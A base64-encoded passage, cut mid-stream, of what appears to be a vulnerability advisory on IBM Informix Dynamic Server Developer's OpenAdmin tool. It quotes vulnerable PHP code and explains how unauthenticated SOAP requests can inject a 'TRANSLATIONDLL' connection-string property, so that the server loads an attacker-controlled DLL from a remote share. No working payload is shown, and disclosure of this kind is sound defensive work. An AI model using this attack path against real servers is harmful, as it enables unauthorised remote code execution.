FnZSddKTsNCgkJCX0NCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRkYiA9IG5ldyBQRE8gKCJ7JGRzbn0iLCR1c2VyLCRwYXNzd29yZCk7DQoJCX0NCgkJcmV0dXJuICRkYjsNCgl9DQouLi4NCg0KQXQgWzNdIGEgY29ubmVjdGlvbiBzdHJpbmcgaXMgY29uY2F0ZW5hdGVkIHdpdGhvdXQgcHJpb3Igc2FuaXRpemF0aW9uLCBhcmJpdHJhcnkgcGFyYW1ldGVycyBjYW4gYmUgaW5qZWN0ZWQgdmlhIOKAmDvigJk7IOKAmFRSQU5TTEFUSU9ORExM4oCZIGFuZCBvdGhlciBkYW5nZXJvdXMgcGFyYW1ldGVycyBjYW4gYmUgc3BlY2lmaWVkLg0KDQpBdCBbNF0sIHRoZSByZXN1bHRpbmcgY29ubmVjdGlvbiBzdHJpbmcgaXMgcGFzc2VkIHRvIHRoZSBQRE8gb2JqZWN0LCBjYXVzaW5nIHRoZSBkbGwgdG8gYmUgbG9hZGVkIGJlZm9yZSB0aGUgYXV0aGVudGljYXRpb24gaXMgcGVyZm9ybWVkLg0KDQpSZW1vdGUgRExMIEluamVjdGlvbiB0aGF0IGxlYWRzIHRvIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiAoMykNCklCTSBJbmZvcm1peCBEeW5hbWljIFNlcnZlciBEZXZlbG9wZXIgaXMgdnVsbmVyYWJsZSB0byBVbmF1dGhlbnRpY2F0aW9uIFJlbW90ZSBETEwgSW5qZWN0aW9uIHRoYXQgbGVhZHMgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uLg0KDQpUaGUgc3BlY2lmaWMgZmxhdyBleGlzdHMgd2l0aGluIHR3byBQSFAgc2NyaXB0cyBpbiBPcGVuQWRtaW4gdG9vbC4NCg0KTUFDSDExU2VydmVyLnBocCBhbGxvd3MgdG8gaW5zZXJ0IGEgcm93IGludG8gdGhlIHVuZGVybHlpbmcgU1FMaXRlIERhdGFiYXNlIHdpdGhvdXQgcHJpb3IgYXV0aGVudGljYXRpb24sIGJ5IHNlbmRpbmcgYSBzcGVjaWZpYyBTT0FQIHJlcXVlc3QgdG8gTUFDSDExU2VydmljZS5waHAgYW5kIHNwZWNpZnlpbmcgdGhlIOKAmGFkZFNlcnZlclRvQ2FjaGXigJggbWV0aG9kLg0KcGluZ2VyLnBocCBjb25zdHJ1Y3QgYSBjb25uZWN0aW9uIHN0cmluZyBmb3IgdGhlIHVuZGVybHlpbmcgSW5mb3JtaXggZGF0YWJhc2UsIGJhc2VkIG9uIHRoZSByb3cgcHJldmlvdXNseSBpbnNlcnRlZC4gR2l2ZW4gdGhpcyBpdCBpcyBwb3NzaWJsZSB0byBpbmplY3QgdGhlIOKAmFRSQU5TTEFUSU9ORExM4oCYIHByb3BlcnR5IGludG8gdGhpcyBjb25uZWN0aW9uIHN0cmluZyBhbmQgdG8gY2F1c2UgdGhlIEFwYWNoZSBwcm9jZXNzIHRvIGxvYWQgdGhlIHBvaW50ZWQgZGxsIGZyb20gYSByZW1vdGUgbmV0d29yayBzaGFyZSBjb250cm9sbGVkIGJ5IHRoZSBhdHRhY2tlci4NCnZ1bG5lcmFibGUgY29kZSDigJMgQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlXE9BVFxBcGFjaGVfMi4yLjIyXGh0ZG9jc1xvcGVuYWRtaW5cc2VydmljZXNcaWRzYWRtaW5cTUFDSDExU2VydmVyLnBocA0KDQouLi4NCglmdW5jdGlvbiBhZGRTZXJ2ZXJUb0NhY2hlICgkZ3JvdXBfbnVtDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICRob3N0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICRwb3J0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICRzZXJ2ZXIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICRpZHNwcm90b2NvbCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgJGxhdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAkbG9uDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICR1c2VybmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAkcGFzc3dvcmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgJGNsdXN0ZXJfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgJGxhc3RfdHlwZSApDQoJew0KCQkNCgkJJHBhc3N3b3JkID0gY29ubmVjdGlvbnM6OmVuY29kZV9wYXNzd29yZCgkcGFzc3dvcmQpOw0KCQkNCgkJJHF1ZXJ5ID0gIklOU0VSVCBJTlRPIGNvbm5lY3Rpb25zICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAoIGdyb3VwX251bSAgICAgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgaG9zdCAgICAgICAgICAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCBwb3J0ICAgICAgICAgICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsIHNlcnZlciAgICAgICAgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgaWRzcHJvdG9jb2wgICAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCBsYXQgICAgICAgICAgICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsIGxvbiAgICAgICAgICAgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgdXNlcm5hbWUgICAgICAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCBwYXNzd29yZCAgICAgICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsIGNsdXN0ZXJfaWQgICAgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgbGFzdF90eXBlICkgICAgICINCiAgICAgICAgICAgICAgIC4gIiBWQUxVRVMgKCAgeyRncm91cF9udW19ICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsICd7JGhvc3R9JyAgICAgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgJ3skcG9ydH0nICAgICAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCAneyRzZXJ2ZXJ9JyAgICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsICd7JGlkc3Byb3RvY29sfSciDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgIHskbGF0fSAgICAgICAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCAgeyRsb259ICAgICAgICAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsICd7JHVzZXJuYW1lfScgICAiDQogICAgICAgICAgICAgICAuICIgICAgICAgICwgJ3skcGFzc3dvcmR9JyAgICINCiAgICAgICAgICAgICAgIC4gIiAgICAgICAgLCAgeyRjbHVzdGVyX2lkfSAgIg0KICAgICAgICAgICAgICAgLiAiICAgICAgICAsICB7JGxhc3RfdHlwZX0gKSAiOw0KDQogICAgICAgICR0aGlzLT5kb0RhdGFiYXNlV29yayAoICRxdWVyeSApOw0KCSAgICByZXR1cm4gJHRoaXMtPmRiLT5sYXN0SW5zZXJ0SWQgKCApOw0KICAgICAgICAvL3JldHVybiBzcWxpdGVfbGFzdF9pbnNlcnRfcm93aWQgKCAkdGhpcy0+ZGIgKTsNCgl9DQouLi4NCg0KVGhlIHByZXZpb3VzbHkgZW1wdHkg4oCYY29ubmVjdGlvbnPigJggdGFibGUgaXMgcG9wdWxhdGVkIHdpdGggb25lIHJvdy4NCg0KTGV04oCZcyBsb29rIGF0IEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZVxPQVRcQXBhY2hlXzIuMi4yMlxodGRvY3Ncb3BlbmFkbWluXGxpYlxwaW5nZXIucGhwDQoNCjw/cGhwDQpbLi5dDQoNCnJlZ2lzdGVyX3NodXRkb3duX2Z1bmN0aW9uKCJzaHV0ZG93bkhhbmRsZXIiLCRkYik7DQoNCmluaV9zZXQoIm1heF9leGVjdXRpb25fdGltZSIsIC0xKTsNCg0KI3NldCB0aGUgbWF4ZXhlY3V0aW9uIHRpbWUuLg0Kc2V0X3RpbWVfbGltaXQoLTEpOw0KDQppZ25vcmVfdXNlcl9hYm9ydChUUlVFKTsNCg0KQGhlYWRlciggJ0NvbnRlbnQtVHlwZTogaW1hZ2UvZ2lmJyApOw0KcHJpbnQgYmFzZTY0X2RlY29kZSggJ1IwbEdPRGxoQVFBQkFJRC9BTURBd0FBQUFDSDVCQUVBQUFBQUxBQUFBQUFCQUFFQUFBSUNSQUVBT3c9PScgKTsNCm9iX2ZsdXNoKCk7DQoNCi8qKg0KICogcGluZ2VyDQogKiBnZXQgLyB1cGRhdGUgdGhlIHN0YXR1cyBvZiBlYWNoIHNlcnZlciBpbiB0aGUgY29ubmVjdGlvbnMgZGIuDQogKi8NCg0KIyBzZXQgdGhlIENPTkZESVINCmRlZmluZShDT05GRElSLCIuLi9jb25mLyIpOw0KDQpyZXF1aXJlX29uY2UoQ09ORkRJUi4iY29uZmlnLnBocCIpOw0KJHBpbmdpbnRlcnZhbD1pc3NldCgkQ09ORlsiUElOR0lOVEVSVkFMIl0pID8gJENPTkZbIlBJTkdJTlRFUlZBTCJdIDogMzAwOw0KDQppZiAoICEgaXNzZXQoJENPTkZbJ0NPTk5EQkRJUiddKSApDQp7DQoJLy8gZXJyb3JfbG9nKCJQbGVhc2UgY2hlY2sgY29uZmlnLnBocCBwYXJhbSBDT05OREJESVIgLSBpdCBkb2VzbnQgc2VlbSB0byBiZSBzZXQuIik7DQoJcmV0dXJuOw0KfQ0KDQppZiAoICEgaXNfZGlyKCRDT05GWydDT05OREJESVInXSkgKQ0Kew0KCWVycm9yX2xvZygiUGxlYXNlIGNoZWNrIGNvbmZpZy5waHAgcGFyYW0gQ09OTkRCRElSIC0gaXQgZG9lc250IHNlZW0gdG8gYmUgc2V0IHRvIGEgZGlyZWN0b3J5LiIpOw0KCXJldHVybjsNCn0NCg0KJGRiZmlsZT0ieyRDT05GWydDT05OREJESVInXX0vY29ubmVjdGlvbnMuZGIiOw0KDQokaW5mb3JtaXhkaXI9Z2V0ZW52KCJJTkZPUk1JWERJUiIpOw0KDQppZiAoICEgZmlsZV9leGlzdHMoJGRiZmlsZSkgKQ0Kew0KCS8vIGVycm9yX2xvZygiKioqIENhbm5vdCBmaW5kIGNvbm5lY3Rpb25zLmRiIC0geyRkYmZpbGV9ICoqKioiKTsNCglkaWUoKTsNCn0NCg0KdW5zZXQoJENPTkYpOw0KDQojIGNvbm5lY3QgdG8gdGhlIHNxbGl0ZSBkYXRhYmFzZS4NCiRkYiA9IG5ldyBQRE8gKCJzcWxpdGU6eyRkYmZpbGV9Iik7DQokZGItPnNldEF0dHJpYnV0ZShQRE86OkFUVFJfQ0FTRSxQRE86OkNBU0VfVVBQRVIpOw0KDQovKioNCiAqIGxldHMgZ2V0IG91ciBsYXN0IHJ1bnRpbWUgYW5kIGlmIHdlIGFyZSBydW5uaW5nIC4uDQogKi8gDQoNCiRxcnkgID0gInNlbGVjdCBsYXN0cnVuICwgaXNydW5uaW5nIGZyb20gcGluZ2VyaW5mbyI7DQokc3RtdCA9ICRkYi0+cXVlcnkoJHFyeSk7DQokcm93ICA9ICRzdG10LT5mZXRjaChQRE86OkZFVENIX0FTU09DKTsNCiRzdG10LT5jbG9zZUN1cnNvcigpOw0KDQppZiAoICRyb3dbJ0lTUlVOTklORyddID4gMCApDQp7DQoJICR0aW1lbm93ID0gdGltZSgpOw0KICAgICAgICBpZiAoICR0aW1lbm93IC0gJHJvd1snTEFTVFJVTiddID4gMzAwMCApDQogICAgICAgIHsNCiAgICAgICAgICAgICAgICBlcnJvcl9sb2coICJSZXNldCBwaW5nZXIgLSBzaG91bGQgcnVuIG5leHQgdGltZSAiKTsNCiAgICAgICAgICAgICAgICAkZGItPnF1ZXJ5KCJ1cGRhdGUgcGluZ2VyaW5mbyBzZXQgaXNydW5uaW5nID0gMCIpOw0KICAgICAgICB9DQogICAgDQoJLyogd2UgYXJlIGFscmVhZHkgcnVubmluZyBzbyBsZXRzIGp1c3QgcXVpdCBub3cgKi8NCglkaWUoKTsNCn0NCg0KJHRpbWVub3cgPSB0aW1lKCk7DQppZiAoICR0aW1lbm93IC0gJHJvd1snTEFTVFJVTiddIDwgJHBpbmdpbnRlcnZhbCApDQp7DQoJLy8gZXJyb3JfbG9nKCAibm8gbmVlZCB0byBydW4gIi4iTGFzdDogIi4oJHRpbWVub3cgLSAkcm93WydMQVNUJ10pLiIgLSB7JHBpbmdpbnRlcnZhbH0iICk7DQoJZGllKCk7DQp9DQoNCiRkYi0+cXVlcnkoInVwZGF0ZSBwaW5nZXJpbmZvIHNldCBpc3J1bm5pbmcgPSB7JHRpbWVub3d9ICIpOw0KDQovLyBlcnJvcl9sb2cgKCAid2UgYmV0dGVyIHJ1biAiLiJMYXN0OiAiLigkdGltZW5vdyAtICRyb3dbJ0xBU1QnXSkuIiAtIHskcGluZ2ludGVydmFsfSIgKTsNCg0KcHV0ZW52KCJJTkZPUk1JWENPTlRJTUU9NSIpOw0KcHV0ZW52KCJJTkZPUk1JWENPTlJFVFJZPTEiKTsNCg0KDQovKioNCiAqIHByZXBhcmUgdGhlIHVwZGF0ZSBzdHJpbmcuDQogKi8NCiR1cGRhdGUgPSAkZGItPnByZXBhcmUoInVwZGF0ZSBjb25uZWN0aW9ucyBzZXQgbGFzdHBpbmd0aW1lPTpub3csIGxhc3RzdGF0dXM9OnN0YXRlICwgbGFzdHN0YXR1c21zZz06c3RhdGVtc2cgd2hlcmUgY29ubl9udW0gPSA6Y29ubl9udW0iKTsNCiR1cGRhdGUyID0gJGRiLT5wcmVwYXJlKCJ1cGRhdGUgY29ubmVjdGlvbnMgc2V0IGxhc3RwaW5ndGltZT06bm93LCBsYXN0c3RhdHVzPTpzdGF0ZSAsIGxhc3RzdGF0dXNtc2c9OnN0YXRlbXNnLCBsYXN0b25saW5lPTpsYXN0b25saW5lIHdoZXJlIGNvbm5fbnVtID0gOmNvbm5fbnVtIik7DQoNCi8qKg0KICogd2UgbmVlZCB0byBpbmNsdWRlIHRoZSBsaWIvY29ubmVjdGlvbnMucGhwDQogKiBzbyB3ZSBjYW4gYWNjZXNzIHRoZSBwYXNzd29yZCBob29rcyBmdW5jdGlvbnMuDQogKi8NCg0KcmVxdWlyZV9vbmNlICdjb25uZWN0aW9ucy5waHAnOw0KLyoqDQogKiBsZXRzIGdldCBhbGwgb3VyIGRlZmluZWQgY29ubmVjdGlvbnMuDQogKi8gDQokc3FsID0gInNlbGVjdCAqIGZyb20gY29ubmVjdGlvbnMgb3JkZXIgYnkgc2VydmVyIjsNCiRzdG10ID0gJGRiLT5xdWVyeSgkc3FsKTsNCiRyb3dzID0gJHN0bXQtPmZldGNoQWxsKFBETzo6RkVUQ0hfQVNTT0MpOw0KDQokc3RhcnR0aW1lPXRpbWUoKTsNCiRzdGF0dXMgPSAiU3RhcnQgVGltZTogeyRzdGFydHRpbWV9XG4iOw0KDQpmb3JlYWNoICggJHJvd3MgYXMgJGs9PiRyb3cgKQ0Kew0KICAgIA0KCSRub3cgPSB0aW1lKCk7DQoJJGRzbiA9IDw8PEVPRg0KaW5mb3JtaXg6aG9zdD17JHJvd1snSE9TVCddfTtzZXJ2aWNlPXskcm93WydQT1JUJ119O2RhdGFiYXNlPXN5c21hc3RlcjtzZXJ2ZXI9eyRyb3dbJ1NFUlZFUiddfTtwcm90b2NvbD17JHJvd1snSURTUFJPVE9DT0wnXX07IC8vPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gWzFdDQpFT0Y7DQoNCglpZiAoIHN1YnN0cihQSFBfT1MsMCwzKSAhPSAiV0lOIiApDQoJew0KCQkkbGlic3VmZml4ID0gKHN0cnRvdXBwZXIoc3Vic3RyKFBIUF9PUywwLDMpKSA9PSAiREFSIik/ICJkeWxpYiI6InNvIjsNCgkJJGRzbiAuPSAiO1RSQU5TTEFUSU9ORExMPXskaW5mb3JtaXhkaXJ9L2xpYi9lc3FsL2lnbzRhMzA0LiIuJGxpYnN1ZmZpeDsNCgkJJGRzbiAuPSAiO0RyaXZlcj17JGluZm9ybWl4ZGlyfS9saWIvY2xpL2xpYmlmZG1yLiIuJGxpYnN1ZmZpeC4iOyI7DQoJfQ0KDQoJJHN0YXRlbWVzc2FnZT0iT25saW5lIjsNCgkkc3RhdGU9MTsNCg0KCSR1c2VyICAgPSAkcm93WydVU0VSTkFNRSddOw0KCSRwYXNzd2QgPSBjb25uZWN0aW9uczo6ZGVjb2RlX3Bhc3N3b3JkKCAkcm93WydQQVNTV09SRCddICk7DQoJDQoNCgl0cnkNCgl7DQoJCSRwaW5nZGIgPSBuZXcgUERPKCRkc24sJHVzZXIsdXRmOF9kZWNvZGUoJHBhc3N3ZCkpOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbMl0NCgl9DQoJY2F0Y2goUERPRXhjZXB0aW9uICRlKQ0KCXsNCgkJLy8gZXJyb3JfbG9nKCAkZS0+Z2V0TWVzc2FnZSgpICk7DQoJCSRtZXNzYWdlPXByZWdfc3BsaXQoIi86LyIsJGUtPmdldE1lc3NhZ2UoKSk7DQoJCSRzdGF0ZW1lc3NhZ2U9IHByZWdfcmVwbGFjZSgiI1xbLitcXSMiLCIiLCRtZXNzYWdlWzFdKTsNCgkJJHN0YXRlbWVzc2FnZS49IiBMYXN0IE9ubGluZToiLmxhc3RvbmxpbmVjb252KCRyb3dbJ0xBU1RPTkxJTkUnXSk7DQoJCSRzdGF0ZT0zOw0KCX0NClsuLl0NCi4uLg0KDQphdCBbMV0gYSBjb25uZWN0aW9uIHN0cmluZyBpcyBjb25jYXRlbmF0ZWQgd2l0aCB2YWx1ZXMgdGFrZW4gZnJvbSBTUUxpdGUgY29ubmVjdGlvbiB0YWJsZS4gQXJiaXRyYXJ5IHByb3BlcnRpZXMgY2FuIGJlIHNwZWNpZmllZCB0aHJvdWdoIOKAnDvigJ0sIGxlYWRpbmcgdG8gcmVtb3RlIGNvZGUNCmV4ZWN1dGlvbiwgd2hlbiBbMl0gdGhlIFBETyBvYmplY3QgaXMgaW5zdGFudGlhdGVkLg0KDQpSZW1vdGUgRExMIEluamVjdGlvbiB0aGF0IGxlYWRzIHRvIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiAoNCkNCklCTSBJbmZvcm1peCBEeW5hbWljIFNlcnZlciBEZXZlbG9wZXIgaXMgdnVsbmVyYWJsZSB0byBVbmF1dGhlbnRpY2F0aW9uIFJlbW90ZSBETEwgSW5qZWN0aW9uIHRoYXQgbGVhZHMgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uLg0KDQpCeSBjb250YWN0IHRoZSDigJhhZG1pbmFwaVNlcnZpY2UucGhw4oCYIFNPQVAgaW50ZXJmYWNlIGFuZCBjb25zdHJ1Y3RpbmcgYSBwcm9wZXIgcmVxdWVzdCB0byB0aGlzIGVuZHBvaW50LCB3aXRoIHRoZSDigJhjcmVhdGVTQlNwYWNl4oCYIG1ldGhvZCBzcGVjaWZpZWQsIGl0IHBvc3NpYmxlIHRvIGluamVjdCBwYXJhbWV0ZXJzIGludG8gYSBjb25uZWN0aW9uIHN0cmluZyBmb3IgdGhlIHVuZGVybHlpbmcgSW5mb3JtaXggZGF0YWJhc2UuDQoNCnZ1bG5lcmFibGUgY29kZSDigJMgQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlXE9BVFxBcGFjaGVfMi4yLjIyXGh0ZG9jc1xvcGVuYWRtaW5cc2VydmljZXNcYWRtaW5hcGlcYWRtaW5hcGlTZXJ2aWNlLnBocA0KDQouLi4NCjw/cGhwDQpbLi5dDQoNCiAgICAvLyB0dXJuIG9mIGNhY2hpbmcgb2YgdGhlIHdzZGwgZm9yIG5vdy4NCiAgICAkaW5pID0gaW5pX3NldCgic29hcC53c2RsX2NhY2hlX2VuYWJsZWQiLCIwIik7DQoNCiAgICAvLyBsb2FkIG91ciBhY3R1YWwgc2VydmVyLiANCiAgICByZXF1aXJlX29uY2UoImFkbWluYXBpU2VydmVyLnBocCIpOw0KDQogICAgLy9jcmVhdGUgb3VyIHNvYXBzZXJ2ZXIuDQogICAgJHNlcnZlciA9IG5ldyBTb2FwU2VydmVyKCJhZG1pbmFwaS53c2RsIik7DQoNCiAgICAkc2VydmVyLT5zZXRDbGFzcygiYWRtaW5hcGlTZXJ2ZXIiKTsNCiAgICAgaWYgKGlzc2V0KCRIVFRQX1JBV19QT1NUX0RBVEEpKSB7DQogICAgICAgICRyZXF1ZXN0ID0gJEhUVFBfUkFXX1BPU1RfREFUQTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkcmVxdWVzdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOw0KICAgIH0NCiAgICAvL2Vycm9yX2xvZygkcmVxdWVzdCk7DQogICAgLy9lcnJvcl9sb2codmFyX2V4cG9ydCgkc2VydmVyLHRydWUpKTsNCiAgICAkc2VydmVyLT5oYW5kbGUoJHJlcXVlc3QpOw0KPz4NCi4uLg0KDQpUaGVyZSBpcyBubyBjaGVjayBiZWZvcmUgaGFuZGxpbmcgcmVxdWVzdC4NCg0KTGV04oCZcyBsb29rIGludG8gdGhlIGNyZWF0ZVNCU3BhY2UoKSBtZXRob2QgZnJvbSBDOlxQcm9ncmFtIEZpbGVzICh4ODYpXElCTSBJbmZvcm1peCBTb2Z0d2FyZSBCdW5kbGVcT0FUXEFwYWNoZV8yLjIuMjJcaHRkb2NzXG9wZW5hZG1pblxzZXJ2aWNlc1xhZG1pbmFwaVxhZG1pbmFwaVNlcnZlci5waHANCg0KLi4uDQpmdW5jdGlvbiBjcmVhdGVTQlNwYWNlKCAkY29ubmVjdGlvbk9iaiwkZGJzbmFtZSwkcGF0aCwkc2l6ZSwkb2Zmc2V0DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICwkbXBhdGg9IiIsJG1vZmZzZXQ9IiIgKQ0KICAgIHsNCg0KICAgICAgICBpZiAoIWRic25hbWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBTb2FwRmF1bHQoImNyZWF0ZVNCU3BhY2UiLCJtaXNzaW5nIHBhcmFtIGRic25hbWUiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICghcGF0aCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhyb3cgbmV3IFNvYXBGYXVsdCgiY3JlYXRlU0JTcGFjZSIsIm1pc3NpbmcgcGFyYW0gcGF0aCIpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCFzaXplKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aHJvdyBuZXcgU29hcEZhdWx0KCJjcmVhdGVTQlNwYWNlIiwibWlzc2luZyBwYXJhbSBzaXplIik7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoIW9mZnNldCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhyb3cgbmV3IFNvYXBGYXVsdCgiY3JlYXRlU0JTcGFjZSIsIm1pc3NpbmcgcGFyYW0gb2Zmc2V0Iik7DQogICAgICAgIH0NCg0KICAgICAgICAkcXJ5ID0gImV4ZWN1dGUgZnVuY3Rpb24gIi5BRE1JTl9BUElfRlVOQ1RJT04uIiAoJ2NyZWF0ZSBzYnNwYWNlJyAiOw0KICAgICAgICAkcXJ5IC49ICIsJ3skZGJzbmFtZX0nIjsNCiAgICAgICAgJHFyeSAuPSAiLCd7JHBhdGh9JyI7DQogICAgICAgICRxcnkgLj0gIiwneyRzaXplfSciOw0KICAgICAgICAkcXJ5IC49ICIsJ3skb2Zmc2V0fSciOw0KDQogICAgICAgIGlmICggJG1wYXRoICkNCiAgICAgICAgew0KICAgICAgICAgICAgJHFyeSAuPSAiLCd7JG1wYXRofSciOw0KDQogICAgICAgICAgICBpZiAoICRtb2Zmc2V0ICkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkcXJ5IC49ICIsJ3skbW9mZnNldH0nIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRxcnkgLj0gIikiOw0KDQogICAgICAgIHJldHVybiAkdGhpcy0+ZG9EYXRhYmFzZVdvcmsoJGNvbm5lY3Rpb25PYmosJHFyeSk7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbMV0NCiAgICB9IC8vIGVuZCBjcmVhdGVTQlNwYWNlDQouLi4NCg0KYXQgWzFdIGRvRGF0YWJhc2VXb3JrKCkgaXMgY2FsbGVkIHdpdGggYSBjb250cm9sbGVkICRjb25uZWN0aW9uT2JqIHBhcmFtZXRlcg0KDQouLi4NCi8qKg0KICAgICAqIGRvRGF0YWJhc2VXb3JrDQogICAgICogIGNvbm5lY3Rpb25PYmogPSB0aGUgY29ubmVjdGlvbiBkZXRhaWxzLg0KICAgICAqICBxcnkgPSB0aGUgcXVlcnkgdG8gZXhlY3V0ZQ0KICAgICAqLw0KICAgIGZ1bmN0aW9uIGRvRGF0YWJhc2VXb3JrKCRjb25uZWN0aW9uT2JqLCRxcnkpDQogICAgew0KICAgICAgICByZXF1aXJlX29uY2UoInNvYXBkYi5waHAiKTsNCg0KICAgICAgICAkaG9zdCAgICAgICA9ICRjb25uZWN0aW9uT2JqLT5ob3N0Ow0KICAgICAgICAkcG9ydCAgICAgICA9ICRjb25uZWN0aW9uT2JqLT5wb3J0Ow0KICAgICAgICAkc2VydmVybmFtZSA9ICRjb25uZWN0aW9uT2JqLT5zZXJ2ZXJuYW1lOw0KICAgICAgICAkdXNlciAgICAgICA9ICRjb25uZWN0aW9uT2JqLT51c2VyOw0KICAgICAgICAkcGFzcyAgICAgICA9ICRjb25uZWN0aW9uT2JqLT5wYXNzd29yZDsNCiAgICAgICAgJHByb3RvY29sICAgPSAkY29ubmVjdGlvbk9iai0+cHJvdG9jb2w7DQogICAgICAgICRkYm5hbWUgICAgID0gInN5c2FkbWluIjsNCiAgICAgICAgDQogICAgICAgICRkYiA9IG5ldyBzb2FwZGIoJGhvc3QsJHBvcnQsJHNlcnZlcm5hbWUsJHByb3RvY29sLCRkYm5hbWUsJHVzZXIsJHBhc3MpOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gWzJdDQogICAgICAgICRzdG10ID0gJGRiLT5xdWVyeSgkcXJ5KTsNCg0KICAgICAgICB3aGlsZSAoJHJvdyA9ICRzdG10LT5mZXRjaCgpICkNCiAgICAgICAgew0KICAgICAgICAgICAgJHJldCA9IGltcGxvZGUoInwiLCRyb3cpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmV0Ow0KICAgIH0gLy8gZW5kIGRvRGF0YWJhc2VXb3JrDQouLi4NCg0KQXQgWzJdIHRoZSDigJhzb2FwZGLigJggY2xhc3MgaXMgaW5zdGFudGlhdGVkIHdpdGggY29udHJvbGxlZCBwYXJhbWV0ZXJzDQoNCl9fY29uc3RydWN0KCkgbWV0aG9kIGZyb20gQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlXE9BVFxBcGFjaGVfMi4yLjIyXGh0ZG9jc1xvcGVuYWRtaW5cc2VydmljZXNcYWRtaW5hcGlcc29hcGRiLnBocA0KDQouLi4NCi8qIGZ1bmN0aW9uIF9fY29uc3RydWN0DQogKiBjb25zdHJ1Y3Rvcg0KICovDQoNCiAgICAgIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRob3N0LCRwb3J0LCRzZXJ2ZXJuYW1lLCRwcm90b2NvbD0ib25zb2N0Y3AiLCRkYm5hbWU9InN5c21hc3RlciIsJHVzZXI9IiIsJHBhc3N3ZD0iIikNCiAgICAgIHsNCgkNCgkjJHBlcnNpc3QgPSBhcnJheSggUERPOjpBVFRSX1BFUlNJU1RFTlQgPT4gZmFsc2UpOw0KCSRwZXJzaXN0ID0gYXJyYXkoIFBETzo6QVRUUl9QRVJTSVNURU5UID0+IHRydWUpOw0KCXB1dGVudigiSU5GT1JNSVhDT05USU1FPTMiKTsNCglwdXRlbnYoIklORk9STUlYQ09OUkVUUlk9MSIpOw0KDQokaW5mb3JtaXhkaXI9IGdldGVudigiSU5GT1JNSVhESVIiKTsNCiRkc24gPSA8PDxFT0YNCmluZm9ybWl4Omhvc3Q9eyRob3N0fTtzZXJ2aWNlPXskcG9ydH07ZGF0YWJhc2U9eyRkYm5hbWV9O3NlcnZlcj17JHNlcnZlcm5hbWV9O3Byb3RvY29sPXskcHJvdG9jb2x9OyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFszXQ0KRU9GOw0KDQogICAgICB0cnkgew0KICAgICAgICAgIHBhcmVudDo6X19jb25zdHJ1Y3QoJGRzbiwkdXNlcix1dGY4X2RlY29kZSgkcGFzc3dkKSwkcGVyc2lzdCk7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFs0XQ0KICAgICAgfSBjYXRjaChQRE9FeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICAgICAgIHRocm93IG5ldyBTb2FwRmF1bHQoIkNvbm5lY3Rpb24gRmFpbGVkOiIsIkRTTjp7JGRzbn0gRVJST1I6eyRlLT5nZXRNZXNzYWdlKCl9Iik7DQogICAgICB9DQoNCiAgICAgIH0gI2VuZCBfX19jb25zdHJ1Y3QNCi4u